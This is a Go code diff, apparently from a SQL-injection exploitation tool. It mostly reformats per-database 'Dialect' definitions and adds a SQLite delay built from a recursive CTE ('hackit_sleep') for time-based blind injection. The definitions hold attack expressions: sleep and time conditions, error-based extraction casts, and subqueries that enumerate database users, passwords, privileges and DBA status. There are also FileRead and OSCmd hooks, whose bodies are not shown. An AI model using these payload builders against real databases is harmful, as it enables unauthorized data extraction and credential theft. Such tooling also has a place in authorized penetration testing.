@@ -8,39 +8,39 @@ import (
 // Dialect contains the SQL syntax differences that matter for extraction.
 // Every function returns a scalar SQL expression unless documented otherwise.
 type Dialect struct {
-	Name           string
-	Aliases        []string
-	Quote          func(string) string
-	Str            func(string) string
-	Concat         func(...string) string
-	Length         func(string) string
-	Substr         func(string, int, int) string
-	ASCII          func(string) string
-	Marker         func(string) string
-	SleepExpr      func(int) string
-	TimeCondition  func(string, int) string
-	ErrorExpr      func(string) (string, bool)
-	Databases      func() string
-	Tables         func(string) string
-	Columns        func(string, string) string
-	CurrentDB      func() string
-	Version        func() string
-	User           func() string
-	Hostname       func() string
-	IsDBA          func() string
-	Privileges     func() string
-	Users          func() string
-	Passwords      func() string
-	Roles          func() string
-	RowCount       func(string, string) string
-	DumpRow        func(string, string, []string, int) string
-	FileRead       func(string) (string, bool)
-	OSCmd          func(string) (string, bool)
-	SearchTables   func(string) string
-	SearchColumns  func(string) string
-	TableColumns   func(string, string) string
-	AllTables      func() string
-	AllColumns     func() string
+	Name          string
+	Aliases       []string
+	Quote         func(string) string
+	Str           func(string) string
+	Concat        func(...string) string
+	Length        func(string) string
+	Substr        func(string, int, int) string
+	ASCII         func(string) string
+	Marker        func(string) string
+	SleepExpr     func(int) string
+	TimeCondition func(string, int) string
+	ErrorExpr     func(string) (string, bool)
+	Databases     func() string
+	Tables        func(string) string
+	Columns       func(string, string) string
+	CurrentDB     func() string
+	Version       func() string
+	User          func() string
+	Hostname      func() string
+	IsDBA         func() string
+	Privileges    func() string
+	Users         func() string
+	Passwords     func() string
+	Roles         func() string
+	RowCount      func(string, string) string
+	DumpRow       func(string, string, []string, int) string
+	FileRead      func(string) (string, bool)
+	OSCmd         func(string) (string, bool)
+	SearchTables  func(string) string
+	SearchColumns func(string) string
+	TableColumns  func(string, string) string
+	AllTables     func() string
+	AllColumns    func() string
 }
 
 func quoteBacktick(s string) string {
@@ -248,7 +248,9 @@ func postgresDialect() *Dialect {
 		Version:   func() string { return "version()" },
 		User:      func() string { return "current_user" },
 		Hostname:  func() string { return "COALESCE(inet_server_addr()::text,'localhost')" },
-		IsDBA:     func() string { return "(SELECT CASE WHEN usesuper THEN 1 ELSE 0 END FROM pg_user WHERE usename=current_user)" },
+		IsDBA: func() string {
+			return "(SELECT CASE WHEN usesuper THEN 1 ELSE 0 END FROM pg_user WHERE usename=current_user)"
+		},
 		Privileges: func() string {
 			return "(SELECT string_agg(privilege_type,chr(30)) FROM information_schema.role_table_grants WHERE grantee=current_user)"
 		},
@@ -408,7 +410,9 @@ func oracleDialect() *Dialect {
 		Version:   func() string { return "(SELECT banner FROM v$version WHERE ROWNUM=1)" },
 		User:      func() string { return "USER" },
 		Hostname:  func() string { return "SYS_CONTEXT('USERENV','SERVER_HOST')" },
-		IsDBA:     func() string { return "(SELECT CASE WHEN COUNT(*)>0 THEN 1 ELSE 0 END FROM user_role_privs WHERE granted_role='DBA')" },
+		IsDBA: func() string {
+			return "(SELECT CASE WHEN COUNT(*)>0 THEN 1 ELSE 0 END FROM user_role_privs WHERE granted_role='DBA')"
+		},
 		Privileges: func() string {
 			return "(SELECT LISTAGG(privilege,CHR(30)) WITHIN GROUP (ORDER BY privilege) FROM user_sys_privs)"
 		},
@@ -455,6 +459,17 @@ func oracleDialect() *Dialect {
 	}
 }
 
+// sqliteSleep burns CPU in a recursive CTE because SQLite has no sleep
+// function. One million rows take roughly 0.7 seconds on a typical machine,
+// so the row count is scaled to the requested delay in seconds.
+func sqliteSleep(n int) string {
+	if n < 1 {
+		n = 1
+	}
+	rows := n * 1500000
+	return fmt.Sprintf("(WITH RECURSIVE hackit_sleep(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM hackit_sleep WHERE x<%d) SELECT count(*) FROM hackit_sleep)", rows)
+}
+
 func sqliteDialect() *Dialect {
 	return &Dialect{
 		Name:    "SQLite",
@@ -467,10 +482,10 @@ func sqliteDialect() *Dialect {
 		ASCII:   func(e string) string { return "UNICODE(" + e + ")" },
 		Marker:  markerPipe,
 		SleepExpr: func(n int) string {
-			return "randomblob(100000000)"
+			return sqliteSleep(n)
 		},
 		TimeCondition: func(cond string, n int) string {
-			return fmt.Sprintf("CASE WHEN (%s) THEN randomblob(100000000) ELSE 1 END", cond)
+			return fmt.Sprintf("CASE WHEN (%s) THEN %s ELSE 1 END", cond, sqliteSleep(n))
 		},
 		ErrorExpr: func(expr string) (string, bool) {
 			return "", false
@@ -741,16 +756,16 @@ func snowflakeDialect() *Dialect {
 
 func bigqueryDialect() *Dialect {
 	return &Dialect{
-		Name:    "BigQuery",
-		Aliases: defaultAliases("BigQuery", "BQ"),
-		Quote:   quoteBacktick,
-		Str:     literal,
-		Concat:  concatFunc("CONCAT"),
-		Length:  func(e string) string { return "LENGTH(" + e + ")" },
-		Substr:  func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
-		ASCII:   func(e string) string { return "ASCII(" + e + ")" },
-		Marker:  markerFunc,
-		SleepExpr: func(n int) string { return "0" },
+		Name:          "BigQuery",
+		Aliases:       defaultAliases("BigQuery", "BQ"),
+		Quote:         quoteBacktick,
+		Str:           literal,
+		Concat:        concatFunc("CONCAT"),
+		Length:        func(e string) string { return "LENGTH(" + e + ")" },
+		Substr:        func(e string, p, l int) string { return fmt.Sprintf("SUBSTR(%s,%d,%d)", e, p, l) },
+		ASCII:         func(e string) string { return "ASCII(" + e + ")" },
+		Marker:        markerFunc,
+		SleepExpr:     func(n int) string { return "0" },
 		TimeCondition: func(cond string, n int) string { return "1" },
 		ErrorExpr: func(expr string) (string, bool) {
 			return fmt.Sprintf("1=CAST(CONCAT('~',(%s),'~') AS INT64)", expr), true
@@ -764,11 +779,11 @@ func bigqueryDialect() *Dialect {
 		Columns: func(db, table string) string {
 			return fmt.Sprintf("(SELECT STRING_AGG(column_name,chr(30)) FROM %s.INFORMATION_SCHEMA.COLUMNS WHERE table_name=%s)", quoteBacktick(db), literal(table))
 		},
-		CurrentDB: func() string { return "@@project_id" },
-		Version:   func() string { return "@@version" },
-		User:      func() string { return "SESSION_USER()" },
-		Hostname:  func() string { return "'bigquery'" },
-		IsDBA:     func() string { return "1" },
+		CurrentDB:  func() string { return "@@project_id" },
+		Version:    func() string { return "@@version" },
+		User:       func() string { return "SESSION_USER()" },
+		Hostname:   func() string { return "'bigquery'" },
+		IsDBA:      func() string { return "1" },
 		Privileges: func() string { return "''" },
 		Users:      func() string { return "''" },
 		Passwords:  func() string { return "''" },
@@ -832,11 +847,11 @@ func firebirdDialect() *Dialect {
 		Columns: func(db, table string) string {
 			return fmt.Sprintf("(SELECT LIST(rdb$field_name,',') FROM rdb$relation_fields WHERE rdb$relation_name=%s)", literal(strings.ToUpper(table)))
 		},
-		CurrentDB: func() string { return "CURRENT_DATABASE" },
-		Version:   func() string { return "rdb$get_context('SYSTEM','ENGINE_VERSION')" },
-		User:      func() string { return "CURRENT_USER" },
-		Hostname:  func() string { return "CURRENT_HOST" },
-		IsDBA:     func() string { return "1" },
+		CurrentDB:  func() string { return "CURRENT_DATABASE" },
+		Version:    func() string { return "rdb$get_context('SYSTEM','ENGINE_VERSION')" },
+		User:       func() string { return "CURRENT_USER" },
+		Hostname:   func() string { return "CURRENT_HOST" },
+		IsDBA:      func() string { return "1" },
 		Privileges: func() string { return "''" },
 		Users:      func() string { return "''" },
 		Passwords:  func() string { return "''" },
@@ -915,11 +930,11 @@ func h2Dialect() *Dialect {
 		Columns: func(db, table string) string {
 			return fmt.Sprintf("(SELECT LISTAGG(COLUMN_NAME,CHAR(30)) WITHIN GROUP (ORDER BY ORDINAL_POSITION) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_SCHEMA=%s AND TABLE_NAME=%s)", literal(strings.ToUpper(db)), literal(strings.ToUpper(table)))
 		},
-		CurrentDB: func() string { return "DATABASE()" },
-		Version:   func() string { return "H2VERSION()" },
-		User:      func() string { return "CURRENT_USER" },
-		Hostname:  func() string { return "'localhost'" },
-		IsDBA:     func() string { return "1" },
+		CurrentDB:  func() string { return "DATABASE()" },
+		Version:    func() string { return "H2VERSION()" },
+		User:       func() string { return "CURRENT_USER" },
+		Hostname:   func() string { return "'localhost'" },
+		IsDBA:      func() string { return "1" },
 		Privileges: func() string { return "''" },
 		Users:      func() string { return "''" },
 		Passwords:  func() string { return "''" },
